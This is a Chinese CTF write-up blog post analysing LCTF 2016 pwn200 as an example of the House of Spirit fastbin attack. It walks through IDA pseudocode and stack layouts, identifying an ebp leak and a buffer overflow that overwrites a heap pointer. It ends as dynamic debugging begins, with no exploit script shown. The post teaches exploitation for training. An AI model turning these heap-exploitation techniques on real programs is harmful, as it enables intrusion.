<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>PWN入门（3-10-2）-fastbin_attack中的House of Spirit（例题） | Cyberangel-blog</title><meta name="author" content="Cyberangel"><meta name="copyright" content="Cyberangel"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="referrer" content="no-referrer"><meta name="description" content="题目来源：LCTF 2016 pwn200题目的 payload 来源：https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;bfc86f286510参考资料：http:&#x2F;&#x2F;liul14n.top&#x2F;2020&#x2F;02&#x2F;17&#x2F;HOS-LCTF2016-pwn200&#x2F;链接: https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;17LTqpqyI_m70U7Z70lnvfQ   密码: ikiq–来自百度网盘超">
<meta property="og:type" content="article">
<meta property="og:title" content="PWN入门（3-10-2）-fastbin_attack中的House of Spirit（例题）">
<meta property="og:url" content="https://cyberangel.cn/2020/10/21/PWN%E5%85%A5%E9%97%A8%EF%BC%883-10-2%EF%BC%89-fastbin_attack%E4%B8%AD%E7%9A%84House%20of%20Spirit%EF%BC%88%E4%BE%8B%E9%A2%98%EF%BC%89/index.html">
<meta property="og:site_name" content="Cyberangel-blog">
<meta property="og:description" content="题目来源：LCTF 2016 pwn200题目的 payload 来源：https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;bfc86f286510参考资料：http:&#x2F;&#x2F;liul14n.top&#x2F;2020&#x2F;02&#x2F;17&#x2F;HOS-LCTF2016-pwn200&#x2F;链接: https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;17LTqpqyI_m70U7Z70lnvfQ   密码: ikiq–来自百度网盘超">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://uploadstatic.mihoyo.com/contentweb/20191114/2019111411181222865.jpg">
<meta property="article:published_time" content="2020-10-21T00:47:23.000Z">
<meta property="article:modified_time" content="2021-07-04T09:57:15.332Z">
<meta property="article:author" content="Cyberangel">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://uploadstatic.mihoyo.com/contentweb/20191114/2019111411181222865.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://cyberangel.cn/2020/10/21/PWN%E5%85%A5%E9%97%A8%EF%BC%883-10-2%EF%BC%89-fastbin_attack%E4%B8%AD%E7%9A%84House%20of%20Spirit%EF%BC%88%E4%BE%8B%E9%A2%98%EF%BC%89/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'PWN入门（3-10-2）-fastbin_attack中的House of Spirit（例题）',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-07-04 17:57:15'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const fontSizeVal = saveToLocal.get('global-font-size')
    if (fontSizeVal !== undefined) {
      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
    }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Cyberangel-blog" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">317</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://uploadstatic.mihoyo.com/contentweb/20191114/2019111411181222865.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Cyberangel-blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">PWN入门（3-10-2）-fastbin_attack中的House of Spirit（例题）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-10-21T00:47:23.000Z" title="发表于 2020-10-21 08:47:23">2020-10-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-07-04T09:57:15.332Z" title="更新于 2021-07-04 17:57:15">2021-07-04</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">6.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>30分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="PWN入门（3-10-2）-fastbin_attack中的House of Spirit（例题）"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><span class="disqus-comment-count"><a href="https://cyberangel.cn/2020/10/21/PWN%E5%85%A5%E9%97%A8%EF%BC%883-10-2%EF%BC%89-fastbin_attack%E4%B8%AD%E7%9A%84House%20of%20Spirit%EF%BC%88%E4%BE%8B%E9%A2%98%EF%BC%89/#disqus_thread"></a></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
<p>题目来源：LCTF 2016 pwn200<br>题目的 payload 来源：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/bfc86f286510">https://www.jianshu.com/p/bfc86f286510</a><br>参考资料：<a target="_blank" rel="noopener" href="http://liul14n.top/2020/02/17/HOS-LCTF2016-pwn200/">http://liul14n.top/2020/02/17/HOS-LCTF2016-pwn200/</a><br>链接: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/17LTqpqyI_m70U7Z70lnvfQ">https://pan.baidu.com/s/17LTqpqyI_m70U7Z70lnvfQ</a>   密码: ikiq<br>–来自百度网盘超级会员 V3 的分享</p>
</blockquote>
<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><p>首先看一下文件的保护情况：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1603241382585-f1992c06-47e3-4b3a-a2d4-5e824e436825.png#align=left&display=inline&height=154&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20201021084937.png&originHeight=154&originWidth=585&size=28391&status=done&style=none&width=585" alt="QQ截图20201021084937.png"><br>可以看到。基本上没有保护，毕竟 2016 年的老程序了。<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1603241464912-4422d689-828a-47e5-a416-44f073765749.png#align=left&display=inline&height=222&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20201021085048.png&originHeight=222&originWidth=699&size=46921&status=done&style=none&width=699" alt="QQ截图20201021085048.png"><br>上面这张图是我本机上 libc 版本和 ubuntu 的版本</p>
<h1 id="IDA-静态分析"><a href="#IDA-静态分析" class="headerlink" title="IDA 静态分析"></a>IDA 静态分析</h1><p>拖入 IDA 中，查看一下伪代码</p>
<h2 id="main-函数"><a href="#main-函数" class="headerlink" title="main 函数"></a>main 函数</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1603241673427-be9c022b-40b0-4a43-a710-7f517cd8c06a.png#align=left&display=inline&height=91&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20201021085255.png&originHeight=91&originWidth=400&size=4152&status=done&style=none&width=400" alt="QQ截图20201021085255.png"><br>main 函数中的第一个函数 sub_40079D()的功能是设置程序的缓冲区，这里就不用管了。<br>主要来看第二个函数 sub_400A8E()</p>
<h2 id="main-gt-sub-400A8E"><a href="#main-gt-sub-400A8E" class="headerlink" title="main-&gt;sub_400A8E"></a>main-&gt;sub_400A8E</h2><blockquote>
<p>根据函数是否有返回值来确定函数的类型是否改为 void</p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1603242561340-4372075d-743f-4f5d-9892-0ee0ab1e17b7.png#align=left&display=inline&height=305&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20201021090903.png&originHeight=305&originWidth=539&size=16970&status=done&style=none&width=539" alt="QQ截图20201021090903.png"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;=<span class="number">47</span>;i++)&#123;</span><br><span class="line">		num+=<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,num);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//48</span></span><br></pre></td></tr></table></figure>

<p>如果你和我一样害怕看循环的次数出错（主要是菜），可以写个代码运行一下就知道了。<br>由于循环的次数为 48 次，而定义变量 v1 的时候分配了 48 字节。假如说我们在输入的时候将这 48 字节的空间填满，根据 printf 的特性，在打印的时候会泄露出栈 ebp 的地址，可以结合 IDA 看一下：</p>
<blockquote>
<p>注意：printf 打印字符串直到\x00 为止</p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1603242821325-9d23123f-c0b5-4f31-a10f-bd631fc86cef.png#align=left&display=inline&height=35&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20201021091332.png&originHeight=35&originWidth=317&size=3746&status=done&style=none&width=317" alt="QQ截图20201021091332.png"><br>双击 v1 进入到 IDA 的 stack 结构界面：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1603242880173-f3debce4-7b36-4d11-b40b-2412922cf8fd.png#align=left&display=inline&height=110&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20201021091433.png&originHeight=110&originWidth=423&size=5610&status=done&style=none&width=423" alt="QQ截图20201021091433.png"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-0000000000000040</span> var_40          dq ?</span><br><span class="line"><span class="number">-0000000000000038</span> var_38          dq ?</span><br><span class="line"><span class="number">-0000000000000030</span> var_30          db <span class="number">48</span> dup(?)  <span class="comment">//变量v1</span></span><br><span class="line">+<span class="number">0000000000000000</span>  s              db <span class="number">8</span> dup(?)   <span class="comment">//sub_400A8E的栈底</span></span><br><span class="line">+<span class="number">0000000000000008</span>  r              db <span class="number">8</span> dup(?)   <span class="comment">//函数的返回地址，返回到地址0x400B59（main）</span></span><br><span class="line">+<span class="number">0000000000000010</span></span><br><span class="line">+<span class="number">0000000000000010</span> ; end of <span class="built_in">stack</span> variables</span><br></pre></td></tr></table></figure>

<p>可以看到变量 v1 和栈底是相连在一起的。更详细的内容可以看之后的动态调试。</p>
<h2 id="main-gt-sub-400A8E-gt-sub-4007DF"><a href="#main-gt-sub-400A8E-gt-sub-4007DF" class="headerlink" title="main-&gt;sub_400A8E-&gt;sub_4007DF"></a>main-&gt;sub_400A8E-&gt;sub_4007DF</h2><blockquote>
<p>请注意，这个函数具有返回值</p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1603243134023-98deaab1-ab6d-4c85-ae26-96c67e523a15.png#align=left&display=inline&height=442&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20201021091833.png&originHeight=442&originWidth=620&size=24312&status=done&style=none&width=620" alt="QQ截图20201021091833.png"></p>
<blockquote>
<p>菜鸟教程：<br>C 库函数 <strong>int atoi(const char *str)</strong> 把参数 <strong>str</strong> 所指向的字符串转换为一个整数（类型为 int 型）。<br>下面是 atoi() 函数的声明。<br>int atoi(const char *str)</p>
<ul>
<li><strong>str</strong> – 要转换为整数的字符串。</li>
</ul>
<p>该函数返回转换后的长整数，如果没有执行有效的转换，则返回零。</p>
</blockquote>
<p>因此，这个函数是用来输入数字并将输入的内容转化成 int 类型数据。</p>
<h2 id="main-gt-sub-400A8E-gt-sub-400A29"><a href="#main-gt-sub-400A8E-gt-sub-400A29" class="headerlink" title="main-&gt;sub_400A8E-&gt;sub_400A29"></a>main-&gt;sub_400A8E-&gt;sub_400A29</h2><p>进入函数 sub_400A29，同样，该函数的类型为 void<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1603243679253-326d0230-a2da-4d81-8092-11d46d833df9.png#align=left&display=inline&height=212&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20201021092751.png&originHeight=212&originWidth=253&size=10812&status=done&style=none&width=253" alt="QQ截图20201021092751.png"><br>这个函数开头就 malloc 了 0x40 的堆空间，然后将 chunk 的 data 段地址赋值给了 dest（v0），之后调用 read 函数让我们输入”money”保存到 buf 中。但这里值得注意的是：buf 的大小是 0x32，而 read 可以读 0x40 个数据，在经过 strcpy 之后会造成 overflow，而被盖掉的是 dest，也就是保存 malloc 出来的 chunk 地址。将申请出来的 chunk 的 data 段地址传入了函数 sub_4009C4。<br>这个函数的栈结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-0000000000000040</span> ; D/A<span class="comment">/*   : change type (data/ascii/array)</span></span><br><span class="line"><span class="comment">-0000000000000040 ; N       : rename</span></span><br><span class="line"><span class="comment">-0000000000000040 ; U       : undefine</span></span><br><span class="line"><span class="comment">-0000000000000040 ; Use data definition commands to create local variables and function arguments.</span></span><br><span class="line"><span class="comment">-0000000000000040 ; Two special fields &quot; r&quot; and &quot; s&quot; represent return address and saved registers.</span></span><br><span class="line"><span class="comment">-0000000000000040 ; Frame size: 40; Saved regs: 8; Purge: 0</span></span><br><span class="line"><span class="comment">-0000000000000040 ;</span></span><br><span class="line"><span class="comment">-0000000000000040</span></span><br><span class="line"><span class="comment">-0000000000000040 buf             db ?</span></span><br><span class="line"><span class="comment">......(省略的内容均为buf的栈空间)</span></span><br><span class="line"><span class="comment">-0000000000000008 dest            dq ?                    ; offset  //存放malloc_data地址</span></span><br><span class="line"><span class="comment">+0000000000000000  s              db 8 dup(?)   //函数sub_400A29的栈底</span></span><br><span class="line"><span class="comment">+0000000000000008  r              db 8 dup(?)   //返回地址，返回到地址0x400B34（sub_400A8E）</span></span><br><span class="line"><span class="comment">+0000000000000010</span></span><br><span class="line"><span class="comment">+0000000000000010 ; end of stack variables</span></span><br></pre></td></tr></table></figure>

<p>ptr 是 void 类型的全局指针<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1603245116835-805c6dd1-43ad-4e85-840b-6ae3855ce40e.png#align=left&display=inline&height=92&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20201021095139.png&originHeight=92&originWidth=672&size=9343&status=done&style=none&width=672" alt="QQ截图20201021095139.png"><br>值得一提的是 strcpy 函数，这个函数将 buf 中的数值复制到 chunk 中，但是 strcpy 函数有个特点就是遇到\x00 就会终止复制，所以这个步骤实际上是可以被绕过的。</p>
<h2 id="main-gt-sub-400A8E-gt-sub-400A29-gt-sub-4009C4"><a href="#main-gt-sub-400A8E-gt-sub-400A29-gt-sub-4009C4" class="headerlink" title="main-&gt;sub_400A8E-&gt;sub_400A29-&gt;sub_4009C4"></a>main-&gt;sub_400A8E-&gt;sub_400A29-&gt;sub_4009C4</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1603244714255-09df4af0-4f90-43a8-aa71-574e6a85f30f.png#align=left&display=inline&height=351&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20201021094508.png&originHeight=351&originWidth=335&size=14666&status=done&style=none&width=335" alt="QQ截图20201021094508.png"></p>
<h2 id="main-gt-sub-400A8E-gt-sub-400A29-gt-sub-4009C4-gt-sub-4009AF"><a href="#main-gt-sub-400A8E-gt-sub-400A29-gt-sub-4009C4-gt-sub-4009AF" class="headerlink" title="main-&gt;sub_400A8E-&gt;sub_400A29-&gt;sub_4009C4-&gt;sub_4009AF"></a>main-&gt;sub_400A8E-&gt;sub_400A29-&gt;sub_4009C4-&gt;sub_4009AF</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1603244816771-4e97feef-4dde-4084-938d-60857aa888a9.png#align=left&display=inline&height=70&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20201021094636.png&originHeight=70&originWidth=729&size=5147&status=done&style=none&width=729" alt="QQ截图20201021094636.png"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">=======EASY HOTEL========</span><br><span class="line"><span class="number">1.</span> check in</span><br><span class="line"><span class="number">2.</span> check out</span><br><span class="line"><span class="number">3.</span> goodbye</span><br><span class="line">your choice :</span><br></pre></td></tr></table></figure>

<p>这是一个界面函数，不用管了。</p>
<h2 id="main-gt-sub-400A8E-gt-sub-400A29-gt-sub-4009C4-gt-sub-4007DF"><a href="#main-gt-sub-400A8E-gt-sub-400A29-gt-sub-4009C4-gt-sub-4007DF" class="headerlink" title="main-&gt;sub_400A8E-&gt;sub_400A29-&gt;sub_4009C4-&gt;sub_4007DF"></a>main-&gt;sub_400A8E-&gt;sub_400A29-&gt;sub_4009C4-&gt;sub_4007DF</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1603244983099-c6544eab-7ea3-4b42-ad6f-f242561a1289.png#align=left&display=inline&height=134&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20201021094937.png&originHeight=134&originWidth=215&size=5600&status=done&style=none&width=215" alt="QQ截图20201021094937.png"><br>这个函数之前分析过了，可以看到有返回值。</p>
<h2 id="main-gt-sub-400A8E-gt-sub-400A29-gt-sub-4009C4-gt-sub-40096D"><a href="#main-gt-sub-400A8E-gt-sub-400A29-gt-sub-4009C4-gt-sub-40096D" class="headerlink" title="main-&gt;sub_400A8E-&gt;sub_400A29-&gt;sub_4009C4-&gt;sub_40096D"></a>main-&gt;sub_400A8E-&gt;sub_400A29-&gt;sub_4009C4-&gt;sub_40096D</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1603246305197-fa20141a-7de3-4a41-af10-7234e6d3d8f0.png#align=left&display=inline&height=266&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20201021101137.png&originHeight=266&originWidth=292&size=8601&status=done&style=none&width=292" alt="QQ截图20201021101137.png"><br>这个函数根据 ptr 指针来判断用户是否登录，当然根据前面的内容可以知道 ptr 所指向的的地址可以被篡改。</p>
<h2 id="main-gt-sub-400A8E-gt-sub-400A29-gt-sub-4009C4-gt-sub-4008B7"><a href="#main-gt-sub-400A8E-gt-sub-400A29-gt-sub-4009C4-gt-sub-4008B7" class="headerlink" title="main-&gt;sub_400A8E-&gt;sub_400A29-&gt;sub_4009C4-&gt;sub_4008B7"></a>main-&gt;sub_400A8E-&gt;sub_400A29-&gt;sub_4009C4-&gt;sub_4008B7</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">sub_4008B7</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;already check in&quot;</span>);    <span class="comment">//检查用户是否登录</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;how long?&quot;</span>);</span><br><span class="line">    LODWORD(nbytes) = sub_4007DF();  <span class="comment">//调用函数进行输入</span></span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)nbytes &lt;= <span class="number">0</span> || (<span class="keyword">signed</span> <span class="keyword">int</span>)nbytes &gt; <span class="number">128</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;invalid length&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      ptr = <span class="built_in">malloc</span>((<span class="keyword">signed</span> <span class="keyword">int</span>)nbytes);  <span class="comment">//创建堆块</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;give me more money : &quot;</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\n%d\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line">      read(<span class="number">0</span>, ptr, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);  <span class="comment">//向堆中写入内容</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;in~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序大概看完了，接下来动态调试看一下。</p>
<h1 id="pwndbg-动态分析"><a href="#pwndbg-动态分析" class="headerlink" title="pwndbg 动态分析"></a>pwndbg 动态分析</h1><h2 id="了解程序的内存分布"><a href="#了解程序的内存分布" class="headerlink" title="了解程序的内存分布"></a>了解程序的内存分布</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1603248747593-5d184108-f7b7-4788-9246-9bb5d37e9467.png#align=left&display=inline&height=237&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20201021105220.png&originHeight=237&originWidth=278&size=19613&status=done&style=none&width=278" alt="QQ截图20201021105220.png"><br>按照这个程序的输入来进行 gdb 调试</p>
